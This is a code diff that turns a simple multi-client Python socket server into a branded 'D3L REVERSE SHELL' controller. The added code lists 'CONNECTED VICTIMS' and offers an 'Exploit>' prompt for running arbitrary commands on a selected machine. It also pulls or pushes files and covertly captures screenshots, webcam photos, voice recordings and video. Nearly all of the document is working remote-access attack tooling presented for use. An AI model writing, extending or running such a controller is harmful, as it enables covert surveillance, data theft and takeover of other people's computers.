@@ -1,243 +1,444 @@
-import socket
 import threading
+import socket
 import time
-import sys
+import requests
+import json
+import os
 from queue import Queue
-import struct
-import signal
 
-NUMBER_OF_THREADS = 2
-JOB_NUMBER = [1, 2]
-queue = Queue()
+NUMBER_OF_THREADS  =  2
+JOB_NUMBER         =  [1, 2]
+queue              =  Queue() 
+all_connections    =  []
+all_addresses      =  []
 
-COMMANDS = {'help':['Shows this help'],
-            'list':['Lists connected clients'],
-            'select':['Selects a client by its index. Takes index as a parameter'],
-            'quit':['Stops current connection with a client. To be used when client is selected'],
-            'shutdown':['Shuts server down'],
-           }
+def socket_create():
+	try:
+		global host
+		global port
+		global s
+		host = ''
+		port = 4278
+		s = socket.socket()
+	except socket.error as msg:
+		print("Socket Creation Error: " + str(msg))
 
-class MultiServer(object):
+def socket_bind():
+	try:
+		global host
+		global port
+		global s
+		print('\nBinding Socket to Port: ' + str(port))
+		s.bind((host,port))
+		s.listen(5)
 
-    def __init__(self):
-        self.host = ''
-        self.port = 9999
-        self.socket = None
-        self.all_connections = []
-        self.all_addresses = []
+	except socket.error as msg:
+		print('Socket Binding Error: ' + str(msg))
+		time.sleep(3)
+		socket_bind()
 
-    def print_help(self):
-        for cmd, v in COMMANDS.items():
-            print("{0}:\t{1}".format(cmd, v[0]))
-        return
+def accept_connections():
+	for c in all_connections:
+		c.close()
+	del all_connections[:]
+	del all_addresses[:]
 
-    def register_signal_handler(self):
-        signal.signal(signal.SIGINT, self.quit_gracefully)
-        signal.signal(signal.SIGTERM, self.quit_gracefully)
-        return
+	while 1:
+		try:
+			conn, address = s.accept()
+			conn.setblocking(1)
+			all_connections.append(conn)
+			all_addresses.append(address)
+			print('\nConnection as Been Stablished: ' + address[0])
+		except:
+			print('Error Accepting Connections')
 
-    def quit_gracefully(self, signal=None, frame=None):
-        print('\nQuitting gracefully')
-        for conn in self.all_connections:
-            try:
-                conn.shutdown(2)
-                conn.close()
-            except Exception as e:
-                print('Could not close connection %s' % str(e))
-                # continue
-        self.socket.close()
-        sys.exit(0)
+def start_turtle():
+	time.sleep(3)
+	while True:
+		cmd = input('Exploit> ')
+		if cmd == '':
+			pass
+		elif cmd == 'clear':
+			os.system('cls')
+		elif cmd == 'list':
+			print()
+			list_connections()
+		elif cmd == 'restart':
+			icon()
+			print()
+		elif cmd == 'shutdown':
+			queue.task_done()
+			print('Server shutdown')
+			break
+		elif 'select' in cmd:
+			conn = get_target(cmd)
+			if conn is not None:
+				send_target_commands(conn)
+		else:
+			print('Command not recognized')
 
-    def socket_create(self):
-        try:
-            self.socket = socket.socket()
-        except socket.error as msg:
-            print("Socket creation error: " + str(msg))
-            # TODO: Added exit
-            sys.exit(1)
-        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        return
+def list_connections():
+	results = ''
+	for i, conn in enumerate(all_connections):
+		try:
+			conn.send(str.encode(' '))
+			conn.recv(20480)
+		except:
+			del all_connections[i]
+			del all_addresses[i]
+			continue
+		results += '      ' + str(i) + '       ' + str(all_addresses[i][0]) + '      ' + str(all_addresses[i][1]) + '\n'
+	print('--------=[  CONNECTED VICTIMS  ]=------------' + '\n' + results)
 
-    def socket_bind(self):
-        """ Bind socket to port and wait for connection from client """
-        try:
-            self.socket.bind((self.host, self.port))
-            self.socket.listen(5)
-        except socket.error as e:
-            print("Socket binding error: " + str(e))
-            time.sleep(5)
-            self.socket_bind()
-        return
+def get_target(cmd):
+	try:
+		target = cmd.replace('select ', '')
+		target = int(target)
+		conn = all_connections[target]
 
-    def accept_connections(self):
-        """ Accept connections from multiple clients and save to list """
-        for c in self.all_connections:
-            c.close()
-        self.all_connections = []
-        self.all_addresses = []
-        while 1:
-            try:
-                conn, address = self.socket.accept()
-                conn.setblocking(1)
-                client_hostname = conn.recv(1024).decode("utf-8")
-                address = address + (client_hostname,)
-            except Exception as e:
-                print('Error accepting connections: %s' % str(e))
-                # Loop indefinitely
-                continue
-            self.all_connections.append(conn)
-            self.all_addresses.append(address)
-            print('\nConnection has been established: {0} ({1})'.format(address[-1], address[0]))
-        return
+		conn.send(str.encode('connected_1284', 'utf-8'))
+		client_response = str(conn.recv(20480), 'utf-8')
 
-    def start_turtle(self):
-        """ Interactive prompt for sending commands remotely """
-        while True:
-            cmd = input('turtle> ')
-            if cmd == 'list':
-                self.list_connections()
-                continue
-            elif 'select' in cmd:
-                target, conn = self.get_target(cmd)
-                if conn is not None:
-                    self.send_target_commands(target, conn)
-            elif cmd == 'shutdown':
-                    queue.task_done()
-                    queue.task_done()
-                    print('Server shutdown')
-                    break
-                    # self.quit_gracefully()
-            elif cmd == 'help':
-                self.print_help()
-            elif cmd == '':
-                pass
-            else:
-                print('Command not recognized')
-        return
+		print('You are now connected to ' + str(all_addresses[target][0]) + '\n')
+		print(client_response, end='')
+		return conn
+	except:
+		print('Not a valid selection')
+		return None
 
-    def list_connections(self):
-        """ List all connections """
-        results = ''
-        for i, conn in enumerate(self.all_connections):
-            try:
-                conn.send(str.encode(' '))
-                conn.recv(20480)
-            except:
-                del self.all_connections[i]
-                del self.all_addresses[i]
-                continue
-            results += str(i) + '   ' + str(self.all_addresses[i][0]) + '   ' + str(
-                self.all_addresses[i][1]) + '   ' + str(self.all_addresses[i][2]) + '\n'
-        print('----- Clients -----' + '\n' + results)
-        return
+def send_target_commands(conn):
+	while True:
+		try:
+			cmd = input()
+			if len(str.encode(cmd)) > 0:
+				# Download File From Victim
+				if cmd[0:8] == 'download':
+					download(cmd,conn)
+				# Upload File From Victim
+				elif cmd[0:6] == 'upload':
+					upload(cmd,conn)
+				# Screenshot	
+				elif cmd[0:10] == 'screenshot':
+					screenshot(cmd,conn)
+				# Camera
+				elif cmd[0:6] == 'camera':
+					camera(cmd,conn)
+				# Voice Record
+				elif cmd[0:9] == 'video_rec':
+					video_record(cmd,conn)
+				# Voice Record
+				elif cmd[0:9] == 'voice_rec':
+					voice_record(cmd,conn)
+				# Clear Screen
+				elif cmd == 'clear':
+					clear(cmd,conn)
+				# Quit Session
+				elif cmd == 'quit':
+					break
+						
+				else:
+					# Send Other Commands
+					conn.send(str.encode(cmd))
+					client_response = str(conn.recv(9000000), 'utf-8')
+					print(client_response, end='')
 
-    def get_target(self, cmd):
-        """ Select target client
-        :param cmd:
-        """
-        target = cmd.split(' ')[-1]
-        try:
-            target = int(target)
-        except:
-            print('Client index should be an integer')
-            return None, None
-        try:
-            conn = self.all_connections[target]
-        except IndexError:
-            print('Not a valid selection')
-            return None, None
-        print("You are now connected to " + str(self.all_addresses[target][2]))
-        return target, conn
+			if cmd == '':
+				conn.send(str.encode('nosent_1486'))
+				client_response = str(conn.recv(9000000), 'utf-8')
+				print(client_response, end='')
 
-    def read_command_output(self, conn):
-        """ Read message length and unpack it into an integer
-        :param conn:
-        """
-        raw_msglen = self.recvall(conn, 4)
-        if not raw_msglen:
-            return None
-        msglen = struct.unpack('>I', raw_msglen)[0]
-        # Read the message data
-        return self.recvall(conn, msglen)
+		except Exception as msg:
+			print('Connection was lost: ' + str(msg))
+			break
 
-    def recvall(self, conn, n):
-        """ Helper function to recv n bytes or return None if EOF is hit
-        :param n:
-        :param conn:
-        """
-        # TODO: this can be a static method
-        data = b''
-        while len(data) < n:
-            packet = conn.recv(n - len(data))
-            if not packet:
-                return None
-            data += packet
-        return data
+def download(cmd,conn):
+	file_Name = cmd[9:]
+	conn.send(str.encode(cmd))
+	client_response = str(conn.recv(20480), 'utf-8')
 
-    def send_target_commands(self, target, conn):
-        """ Connect with remote target client 
-        :param conn: 
-        :param target: 
-        """
-        conn.send(str.encode(" "))
-        cwd_bytes = self.read_command_output(conn)
-        cwd = str(cwd_bytes, "utf-8")
-        print(cwd, end="")
-        while True:
-            try:
-                cmd = input()
-                if len(str.encode(cmd)) > 0:
-                    conn.send(str.encode(cmd))
-                    cmd_output = self.read_command_output(conn)
-                    client_response = str(cmd_output, "utf-8")
-                    print(client_response, end="")
-                if cmd == 'quit':
-                    break
-            except Exception as e:
-                print("Connection was lost %s" %str(e))
-                break
-        del self.all_connections[target]
-        del self.all_addresses[target]
-        return
+	if client_response == 'FILE FOUND':
 
+		print()
+		print('  [!] FILE FOUND')
+		f = open(file_Name, 'wb')
+		file_Size = str(conn.recv(1024), 'utf-8')
+		time.sleep(1)
+
+		print('  [*] File Name: ' + str(file_Name))
+		print('  [*] File Size: ' + str(file_Size))
+		print('  [!] Downloading...')
+
+		data = conn.recv(int(20480))
+
+		while not ('COMPLETE' in str(data)):
+			f.write(data)
+			data = conn.recv(20480)
+		f.close()
+
+		print('  [!] DOWNLOADING COMPLETE')
+		print()
+		conn.send(str.encode('DOWNLOAD COMPLETE', 'utf-8'))
+
+	else:
+		print()
+		print('  [!] FILE NOT FOUND')
+		print('  [*] Please Try Again')
+		print()
+	
+	client_response = str(conn.recv(20480), 'utf-8')
+	print(client_response, end='')
+
+def upload(cmd,conn):
+	file_Name = cmd[7:]
+	if (os.path.exists(file_Name)):
+
+		file_Size = os.path.getsize(file_Name)
+		conn.send(str.encode(cmd))
+		time.sleep(1)
+
+		print()
+		print('  [!] FILE FOUND')
+		print('  [!] Uploading: ' + file_Name)
+		print('  [*] File Size: ' + str(file_Size))
+		print('  [!] Uploading...')
+		conn.send(str.encode(str(file_Size), 'utf-8'))
+		time.sleep(1)
+
+		f = open(file_Name, 'rb')
+		data = f.read(20480) 
+
+		while data:
+			conn.send(data)
+			data = f.read(20480)
+			
+		time.sleep(1)
+		conn.send(str.encode('COMPLETE'))
+		f.close()
+
+		client_response = str(conn.recv(20480), 'utf-8')
+		if client_response == 'upload_complete_1243':
+			print('  [!] UPLOADING COMPLETE')
+			print()
+
+	else:
+		conn.send(str.encode('upload not found 59269164', 'utf-8'))
+		print()
+		print('  [!] FILE NOT FOUND')
+		print('  [*] Please Try Again')
+		print()
+
+	client_response = str(conn.recv(20480), 'utf-8')
+	print(client_response, end='')
+
+def screenshot(cmd,conn):
+	file_Name = cmd[11:]
+	conn.send(str.encode(cmd))
+	client_response = str(conn.recv(1024),'utf-8')
+
+	if client_response == 'CAPTURING_SCREEN':
+
+		print()
+		print('  [!] SCREENSHOT')
+		
+		f = open(file_Name, 'wb')
+		file_Size = str(conn.recv(1024), 'utf-8')
+
+		print('  [*] File Name: ' + str(file_Name))
+		print('  [*] File Size: ' + str(file_Size))
+		print('  [!] Downloading Screenshot...')
+
+		data = conn.recv(int(20480))
+
+		while not ('COMPLETE' in str(data)):
+			f.write(data)
+			data = conn.recv(20480)
+		f.close()
+
+		print('  [!] SCREENSHOT COMPLETE')
+		print()
+
+		time.sleep(1)
+		os.system(file_Name)
+		conn.send(str.encode('SCREENSHOT COMPLETE', 'utf-8'))
+
+	else:
+		print()
+		print('  [!] SCREENSHOT FAILED: ' + client_response )
+		print('  [*] Please Try Again') 
+		print()
+	
+	client_response = str(conn.recv(20480), 'utf-8')
+	print(client_response, end='')
+
+def camera(cmd,conn):
+
+	file_Name = cmd[7:]
+
+	print()
+	print('  [!] CAMERA SNAP')
+	print('  [*] File Name: ' + str(file_Name))
+
+	conn.send(str.encode(cmd))
+	client_response = str(conn.recv(20480), 'utf-8')
+
+	if client_response == 'CAPTURING_CAMERA':
+
+		f = open(file_Name, 'wb')
+		file_Size = str(conn.recv(1024), 'utf-8')
+
+		print('  [*] File Size: ' + str(file_Size))
+		print('  [!] Downloading Camsnap...')
+
+		data = conn.recv(int(20480))
+
+		while not ('COMPLETE' in str(data)):
+			f.write(data)
+			data = conn.recv(20480)
+		f.close()
+
+		print('  [!] CAMSNAP COMPLETE')
+		print()
+
+		time.sleep(1)
+		os.system(file_Name)
+		conn.send(str.encode('CAMSNAP COMPLETE', 'utf-8'))
+
+	else:
+		print()
+		print('  [!] CAMSNAP FAILED')
+		print('  [*] Please Try Again') 
+		print()
+	
+	client_response = str(conn.recv(20480),'utf-8')
+	print(client_response, end='')
+
+def voice_record(cmd,conn):
+	file_Name = 'AudioRecord.wav'
+	duration = cmd[10:]
+	conn.send(str.encode(cmd))
+
+	client_response = str(conn.recv(20480), 'utf-8')
+	if client_response == 'VOICE_RECORDING':
+
+		print()
+		print('  [!] VOICE RECORD')
+		print('  [!] Recording, Please wait for: ' + duration + ' sec')
+		f = open(file_Name, 'wb')
+		file_Size = str(conn.recv(1024), 'utf-8')
+
+		print('  [*] File Name: ' + str(file_Name))
+		print('  [*] File Size: ' + str(file_Size))
+		print('  [!] Downloading Voice Record...')
+
+		data = conn.recv(int(20480))
+
+		while not ('COMPLETE' in str(data)):
+			f.write(data)
+			data = conn.recv(20480)
+		f.close()
+
+		print('  [!] DOWNLOADING VOICE RECORD COMPLETE')
+		print()
+
+		conn.send(str.encode('VOICE RECORD COMPLETE', 'utf-8'))
+
+	else:
+		print()
+		print('  [!] VOICE RECORD FAILED: ' + client_response )
+		print('  [*] Please Try Again') 
+		print()
+	
+	client_response = str(conn.recv(20480), 'utf-8')
+	print(client_response, end='')
+
+def video_record(cmd,conn):
+	file_Name = 'VideoRecord.wav'
+	duration = cmd[10:]
+	conn.send(str.encode(cmd))
+
+	client_response = str(conn.recv(20480), 'utf-8')
+	if client_response == 'VIDEO_RECORDING':
+
+		print()
+		print('  [!] VIDEO RECORD')
+		print('  [!] Recording, Please wait for: ' + duration + ' sec')
+		f = open(file_Name, 'wb')
+		file_Size = str(conn.recv(1024), 'utf-8')
+
+		print('  [*] File Name: ' + str(file_Name))
+		print('  [*] File Size: ' + str(file_Size))
+		print('  [!] Downloading Video Record...')
+
+		data = conn.recv(int(20480))
+
+		while not ('COMPLETE' in str(data)):
+			f.write(data)
+			data = conn.recv(20480)
+		f.close()
+
+		print('  [!] DOWNLOADING VIDEO RECORD COMPLETE')
+		print()
+
+		conn.send(str.encode('VIDEO RECORD COMPLETE', 'utf-8'))
+
+	else:
+		print()
+		print('  [!] VIDEO RECORD FAILED: ' + client_response )
+		print('  [*] Please Try Again') 
+		print()
+	
+	client_response = str(conn.recv(20480), 'utf-8')
+	print(client_response, end='')
+
+def clear(cmd,conn):
+	conn.send(str.encode(cmd))
+	os.system('cls')
+	client_response = str(conn.recv(20480), 'utf-8')
+	print(client_response, end='')
 
 def create_workers():
-    """ Create worker threads (will die when main exits) """
-    server = MultiServer()
-    server.register_signal_handler()
-    for _ in range(NUMBER_OF_THREADS):
-        t = threading.Thread(target=work, args=(server,))
-        t.daemon = True
-        t.start()
-    return
+	for _ in range(NUMBER_OF_THREADS):
+		t = threading.Thread(target=work)
+		t.daemon = True
+		t.start()
 
-
-def work(server):
-    """ Do the next job in the queue (thread for handling connections, another for sending commands)
-    :param server:
-    """
-    while True:
-        x = queue.get()
-        if x == 1:
-            server.socket_create()
-            server.socket_bind()
-            server.accept_connections()
-        if x == 2:
-            server.start_turtle()
-        queue.task_done()
-    return
-
+def work():
+	while True:
+		x = queue.get()
+		if x==1:
+			socket_create()
+			socket_bind()
+			accept_connections()
+		if x==2:
+			start_turtle()
+		queue.task_done()
+	
 def create_jobs():
-    """ Each list item is a new job """
-    for x in JOB_NUMBER:
-        queue.put(x)
-    queue.join()
-    return
+	for x in JOB_NUMBER:
+		queue.put(x)
+	queue.join()
 
-def main():
-    create_workers()
-    create_jobs()
+def restart():
+	icon()
 
+def icon():
+	os.system('cls')
+	print()
+	print('  DDDDDDDCDDD     33333333333     L                ')
+	print('   DDD      DDD   33      3333    LL               ')
+	print('   DDD       DDD  3        3333   LLL              ')
+	print('   DDD       DDDD           3333  LLL              ')
+	print('   DDD       DDDD      333333333  LLL              ')
+	print('   DDD       DDDD           3333  LLL              ')
+	print('   DDD       DDDD           3333  LLL        L     ')
+	print('   DDD       DDD  3        3333   LLL        LL    ')
+	print('   DDD      DDD   33      3333    LLL        LLL   ')
+	print('  DDDDDDCDDDD     33333333333    LLLLLLLLLLLLLLL   ')
+	print('  [--------------------------------------------]')
+	print('  [--------==[[ D3L REVERSE SHELL ]]==---------]')
+	print('  [--------------------------------------------]')
 
-if __name__ == '__main__':
-    main()
+#icon()
+create_workers()
+create_jobs()
